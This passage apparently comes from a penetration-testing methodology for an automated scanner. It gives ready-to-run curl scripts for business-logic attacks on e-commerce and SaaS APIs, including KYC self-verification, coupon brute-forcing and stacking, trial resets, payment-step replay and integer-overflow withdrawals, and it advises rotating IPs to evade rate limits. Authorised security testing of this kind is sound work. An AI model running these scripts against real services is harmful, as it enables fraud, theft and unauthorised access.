    "status": "confirmed",
    "payment_status": "completed",
    "paid_at": "2024-01-01T00:00:00Z"
  }'

# === Test: Skip verification, access protected features ===
echo "=== Testing: Access verified-only features ==="

# Check current verification status
curl -s "$TARGET_URL/api/me" -H "Authorization: Bearer $ACCESS_TOKEN" | jq '.verified'

# Try to access feature that requires verification
curl -X POST "$TARGET_URL/api/withdraw" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -d '{"amount": 1000}'

# Try to set verified status directly
curl -X PATCH "$TARGET_URL/api/me" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -d '{"verified": true, "verified_at": "2024-01-01"}'

# === Test: Skip approval workflow ===
echo "=== Testing: Bypass approval requirement ==="

curl -X POST "$TARGET_URL/api/requests" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -d '{"type": "budget_increase", "amount": 10000, "status": "approved", "approved_by": "admin_123"}'
```

### Output

```yaml
phase_16_6:
  status: completed

  workflow_bypass_tests: {number}

  findings:
    - workflow: "Order Creation"
      bypass: "Direct POST with status=confirmed"
      result: "BLOCKED"
      reason: "Status field ignored, set to 'pending' automatically"

    - workflow: "KYC Verification"
      bypass: "PATCH /api/me with verified=true"
      result: "VULNERABLE"
      impact: "Users can self-verify without identity check"
      severity: "CRITICAL"

  severity: "{highest}"
```

---

## Phase 16.7: Coupon/Discount Abuse (Extended)

### Objective
Exploit coupon and discount systems for unauthorized savings or fraud.

### Attack Categories

| Attack | Description | Example |
|--------|-------------|---------|
| Code Enumeration | Guess valid coupon codes | Bruteforce SAVE10, SAVE20... |
| Stacking | Apply multiple exclusive coupons | 20% + 30% + free shipping |
| Reuse | Use single-use coupon multiple times | Race condition, session manipulation |
| Transfer | Use another user's personal coupon | IDOR on coupon ownership |
| Expiry Bypass | Use expired coupons | Time manipulation |

### Execution

```bash
TARGET_URL="https://target.com"
ACCESS_TOKEN="..."

# === Test 16.7.1: Coupon code enumeration ===
echo "=== Testing: Brute force coupon codes ==="

COMMON_PATTERNS=("SAVE" "DISCOUNT" "FREE" "WELCOME" "NEW" "VIP" "SUMMER" "WINTER" "FLASH")
SUFFIXES=("10" "15" "20" "25" "30" "50" "100" "2024" "2025")

for PATTERN in "${COMMON_PATTERNS[@]}"; do
  for SUFFIX in "${SUFFIXES[@]}"; do
    CODE="$PATTERN$SUFFIX"
    RESPONSE=$(curl -s -X POST "$TARGET_URL/api/cart/coupon" \
      -H "Authorization: Bearer $ACCESS_TOKEN" \
      -d "{\"code\": \"$CODE\"}")

    if echo "$RESPONSE" | grep -q "success"; then
      echo "VALID COUPON: $CODE"
    fi
  done
done

# === Test 16.7.2: Coupon stacking ===
echo "=== Testing: Apply multiple coupons ==="

curl -X POST "$TARGET_URL/api/cart/coupon" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -d '{"code": "SAVE20"}'

curl -X POST "$TARGET_URL/api/cart/coupon" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -d '{"code": "FREESHIP"}'

curl -X POST "$TARGET_URL/api/cart/coupon" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -d '{"code": "NEWUSER10"}'

# Check total discount
curl -s "$TARGET_URL/api/cart" -H "Authorization: Bearer $ACCESS_TOKEN" | jq '.discounts'

# === Test 16.7.3: Another user's coupon ===
echo "=== Testing: Use another user's personal coupon ==="

# If coupons are tied to user IDs
curl -X POST "$TARGET_URL/api/cart/coupon" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -d '{"code": "PERSONAL_ABC123", "user_id": "other_user_456"}'
```

### Output

```yaml
phase_16_7:
  status: completed

  coupon_abuse_tests: {number}

  findings:
    - test: "Code enumeration"
      valid_codes_found: 5
      codes: ["SAVE10", "WELCOME20", "FLASH50", "VIP30", "NEWUSER15"]
      severity: "MEDIUM"

    - test: "Coupon stacking"
      result: "VULNERABLE"
      coupons_applied: 3
      total_discount: "85%"
      severity: "HIGH"

  severity: "{highest}"
```

---

## Phase 16.9: Subscription/Trial Abuse (Extended)

### Objective
Exploit subscription and trial systems to gain unauthorized access to premium features or extend trial periods indefinitely.

### Attack Categories

| Attack | Description | Impact |
|--------|-------------|--------|
| Trial Extension | Reset trial period multiple times | Free premium forever |
| Plan Confusion | Downgrade but keep premium features | Pay less, get more |
| Cancel-Resubscribe | Abuse refund + new trial loop | Repeated free access |
| Grace Period Abuse | Access features after cancellation | Unauthorized use |

### Execution

```bash
TARGET_URL="https://target.com"
ACCESS_TOKEN="..."

# === Test: Trial extension via account manipulation ===
echo "=== Testing: Reset trial period ==="

# Check current trial status
curl -s "$TARGET_URL/api/subscription" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq '.trial_ends_at'

# Attempt to reset trial
curl -X POST "$TARGET_URL/api/subscription/trial/start" \
  -H "Authorization: Bearer $ACCESS_TOKEN"

# Attempt to modify trial end date directly
curl -X PATCH "$TARGET_URL/api/subscription" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -d '{"trial_ends_at": "2030-12-31T23:59:59Z"}'

# === Test: Downgrade with feature retention ===
echo "=== Testing: Access premium features after downgrade ==="

# Downgrade to free plan
curl -X POST "$TARGET_URL/api/subscription/downgrade" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -d '{"plan": "free"}'

# Try to access premium feature
curl -X GET "$TARGET_URL/api/premium/reports" \
  -H "Authorization: Bearer $ACCESS_TOKEN"

# === Test: Cancel and re-trial ===
echo "=== Testing: Cancel-resubscribe loop ==="

curl -X POST "$TARGET_URL/api/subscription/cancel" \
  -H "Authorization: Bearer $ACCESS_TOKEN"

# Wait and try new trial
curl -X POST "$TARGET_URL/api/subscription/trial/start" \
  -H "Authorization: Bearer $ACCESS_TOKEN"
```

### Output

```yaml
phase_16_9:
  status: completed

  subscription_abuse_tests:
    trial_extension:
      result: "{VULNERABLE|BLOCKED}"
      method: "{how it was extended}"
    feature_retention:
      result: "{VULNERABLE|BLOCKED}"
      features_accessible: ["{list}"]
    cancel_resubscribe:
      result: "{VULNERABLE|BLOCKED}"
      trials_allowed: {number}

  severity: "{highest}"
```

---

## Phase 16.11: Multi-Step Transaction Tampering (Extended)

### Objective
Exploit vulnerabilities in multi-step processes where data can be modified between steps, leading to inconsistent or fraudulent outcomes.

### Attack Categories

| Attack | Description | Impact |
|--------|-------------|--------|
| Step Data Modification | Change cart between checkout steps | Price mismatch |
| Session Hijacking | Take over transaction mid-flow | Fraud |
| Step Replay | Replay successful step with different data | Duplicate benefits |
| Parallel Sessions | Run same flow in two sessions | Race conditions |

### Execution

```bash
TARGET_URL="https://target.com"
ACCESS_TOKEN="..."

# === Multi-step checkout manipulation ===
echo "=== Testing: Modify cart during checkout ==="

# Step 1: Start checkout
CHECKOUT=$(curl -s -X POST "$TARGET_URL/api/checkout/init" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -d '{"cart_id": "cart_123"}')

CHECKOUT_ID=$(echo "$CHECKOUT" | jq -r '.checkout_id')
echo "Checkout started: $CHECKOUT_ID"

# Step 2: WHILE checkout is in progress, modify cart
curl -X POST "$TARGET_URL/api/cart/add" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -d '{"product_id": "expensive_item", "quantity": 10}'

# Step 3: Complete checkout (will it use old or new cart?)
curl -X POST "$TARGET_URL/api/checkout/$CHECKOUT_ID/complete" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -d '{"payment_method": "card_xxx"}'

# Check: Does final order match modified cart or original?

# === Test: Step replay ===
echo "=== Testing: Replay successful payment step ==="

# Capture successful payment confirmation
PAYMENT_CONFIRM='{"checkout_id": "checkout_123", "payment_id": "pay_success", "status": "completed"}'

# Replay with different checkout
curl -X POST "$TARGET_URL/api/checkout/checkout_456/confirm" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -d "$PAYMENT_CONFIRM"

# === Test: Parallel session attack ===
echo "=== Testing: Two checkouts, one payment ==="

# Session 1: Start checkout for $100 item
CHECKOUT_1=$(curl -s -X POST "$TARGET_URL/api/checkout/init" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -d '{"cart_id": "cart_cheap"}')

# Session 2: Start checkout for $1000 item
CHECKOUT_2=$(curl -s -X POST "$TARGET_URL/api/checkout/init" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -d '{"cart_id": "cart_expensive"}')

# Complete payment on cheap checkout
# Then try to complete expensive checkout claiming payment done
```

### Output

```yaml
phase_16_11:
  status: completed

  multi_step_tampering_tests:
    cart_modification_during_checkout:
      result: "{VULNERABLE|BLOCKED}"
      final_total: "{expected vs actual}"
    step_replay:
      result: "{VULNERABLE|BLOCKED}"
      replayed_successfully: {true|false}
    parallel_sessions:
      result: "{VULNERABLE|BLOCKED}"

  severity: "{highest}"
```

---

## Phase 16.13: Integer Overflow/Underflow (Extended)

### Objective
Exploit numeric boundary conditions that cause calculation errors, leading to incorrect totals, negative balances, or bypassed limits.

### Attack Categories

| Attack | Description | Impact |
|--------|-------------|--------|
| Integer Overflow | Value exceeds MAX_INT, wraps to negative | Negative price |
| Integer Underflow | Value goes below MIN_INT, wraps to positive | Credit generation |
| Precision Loss | Float calculations lose precision | Rounding exploits |
| Type Confusion | String/number type coercion issues | Bypass validation |

### Execution

```bash
TARGET_URL="https://target.com"
ACCESS_TOKEN="..."

# === Integer boundary values ===
OVERFLOW_VALUES=(
  "2147483647"        # INT32_MAX
  "2147483648"        # INT32_MAX + 1 (overflow)
  "9223372036854775807"  # INT64_MAX
  "9223372036854775808"  # INT64_MAX + 1
  "-2147483648"       # INT32_MIN
  "-2147483649"       # INT32_MIN - 1 (underflow)
)

# === Test: Quantity overflow ===
echo "=== Testing: Quantity integer overflow ==="

for VALUE in "${OVERFLOW_VALUES[@]}"; do
  echo "Testing quantity: $VALUE"
  RESPONSE=$(curl -s -X POST "$TARGET_URL/api/cart/add" \
    -H "Authorization: Bearer $ACCESS_TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"product_id\": \"prod_123\", \"quantity\": $VALUE}")
  echo "Response: $RESPONSE"

  # Check if total went negative or wrapped
  TOTAL=$(echo "$RESPONSE" | jq '.cart.total')
  if [[ "$TOTAL" == "-"* ]]; then
    echo "VULNERABLE: Negative total detected!"
  fi
done

# === Test: Price multiplication overflow ===
echo "=== Testing: Price * quantity overflow ==="

# Product price: $100
# Quantity that causes overflow: INT_MAX / 100 + 1
curl -X POST "$TARGET_URL/api/cart/add" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -d '{"product_id": "prod_100", "quantity": 21474837}'

# === Test: Discount percentage overflow ===
echo "=== Testing: Discount calculation overflow ==="

curl -X POST "$TARGET_URL/api/cart/coupon" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -d '{"code": "TEST", "discount_percent": 2147483647}'

# === Test: Balance underflow ===
echo "=== Testing: Withdrawal underflow ==="

# Withdraw MAX_INT when balance is $100
curl -X POST "$TARGET_URL/api/wallet/withdraw" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -d '{"amount": 2147483647}'

# Check if balance went negative or wrapped to large positive
curl -s "$TARGET_URL/api/wallet" -H "Authorization: Bearer $ACCESS_TOKEN"
```

### Supabase-Specific Overflow Testing

```bash
SUPABASE_URL="https://xxx.supabase.co"
ANON_KEY="..."
ACCESS_TOKEN="..."

# === Test: Numeric column overflow ===
echo "=== Testing: Supabase numeric overflow ==="

# If column is INTEGER (4 bytes), test overflow
curl -X PATCH "$SUPABASE_URL/rest/v1/accounts?id=eq.{account_id}" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"balance": 9223372036854775807}'

# Check if it was truncated or errored
curl -s "$SUPABASE_URL/rest/v1/accounts?id=eq.{account_id}&select=balance" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN"
```

### Output

```yaml
phase_16_13:
  status: completed

  integer_overflow_tests:
    quantity_overflow:
      tested_values: [{list}]
      result: "{VULNERABLE|BLOCKED}"
      behavior: "Wrapped to negative / Truncated / Error"

    price_multiplication:
      result: "{VULNERABLE|BLOCKED}"
      overflow_at: "{value}"

    discount_overflow:
      result: "{VULNERABLE|BLOCKED}"
      final_discount: "{value}"

    balance_underflow:
      result: "{VULNERABLE|BLOCKED}"
      final_balance: "{value}"

  type_handling:
    string_number_coercion: "{behavior}"
    scientific_notation: "{accepted|rejected}"
    null_handling: "{behavior}"

  severity: "{highest}"
```

---

## Output Format

### FASE_16_RESULTS YAML Structure

```yaml
FASE_16_RESULTS:
  target_url: "{url}"
  scan_timestamp: "{ISO timestamp}"
  status: "{completed|partial}"

  application_profile:
    type: "{e-commerce|saas|booking|fintech|social|other}"
    critical_workflows: {count}
    high_value_targets: {count}

  # Core Checklist (16.1-16.5)
  workflow_analysis:
    workflows_mapped: {count}
    states_identified: {count}
    bypass_candidates: {count}

  state_manipulation:
    tests_executed: {number}
    vulnerabilities: {number}
    critical_findings: [{list with POC}]

  limit_bypass:
    limits_tested: {number}
    bypasses_found: {number}
    findings: [{list}]

  race_conditions:
    endpoints_tested: {number}
    vulnerable_endpoints: {number}
    findings: [{list with timing data}]

  price_manipulation:
    tests_executed: {number}
    vulnerabilities: {number}
    financial_impact: "{estimated loss}"

  # Extended Analysis (16.6-16.13)
  workflow_bypass:
    tests: {number}
    findings: {number}

  coupon_abuse:
    codes_enumerated: {number}
    stacking_vulnerable: {true|false}

  subscription_abuse:
    trial_extension: {true|false}
    feature_retention: {true|false}

  multi_step_tampering:
    cart_modification: {true|false}
    step_replay: {true|false}

  integer_overflow:
    vulnerable_fields: [{list}]
    severity: "{severity}"

  # Summary
  total_tests_executed: {number}
  vulnerabilities_found: {number}

  severity_summary:
    critical: {count}
    high: {count}
    medium: {count}
    low: {count}

  business_impact:
    estimated_financial_loss: "{amount}"
    fraud_vectors: [{list}]
    compliance_risks: [{list}]

  integration_status: "Added to SCAN-IN-PROGRESS.md"

  severity: "{highest severity among findings}"
```

---

## References

### Methodologies
- OWASP Testing Guide - Business Logic Testing
- STRIDE Threat Modeling - Microsoft SDL
- OWASP ASVS - Session Management, Business Logic
- CWE-840: Business Logic Errors

### Internal References
- `Documentos/App/CHECKLIST.md` - Master checklist (FASE 16)
- `references/threat-modeling-patterns.md` - STRIDE templates
- `references/race-condition-patterns.md` - TOCTOU exploitation

### Tools
- **Burp Suite** - Intruder for race conditions, Repeater for state manipulation
- **OWASP ZAP** - Fuzzing, automated scanning
- **GNU Parallel** - Concurrent request testing
- **Playwright** - Workflow automation and API interception

---

## Error Handling

**If workflows unclear:**
```yaml
FASE_16_RESULTS:
  status: partial
  reason: "Unable to identify critical workflows"
  recommendation: "Request application documentation or demo"
  executed: ["16.3", "16.4", "16.5"]  # Generic tests
  skipped: ["16.1", "16.2", "16.6+"]  # Workflow-specific tests
```

**If authentication required:**
```yaml
FASE_16_RESULTS:
  status: blocked
  reason: "Business logic tests require authenticated session"
  recommendation: "Complete FASE 14 first to obtain test account"
```

**If rate limited:**
```yaml
FASE_16_RESULTS:
  status: partial
  rate_limited_at: "16.4 Race Conditions"
  recommendation: "Add delays between requests or use multiple IPs"
```
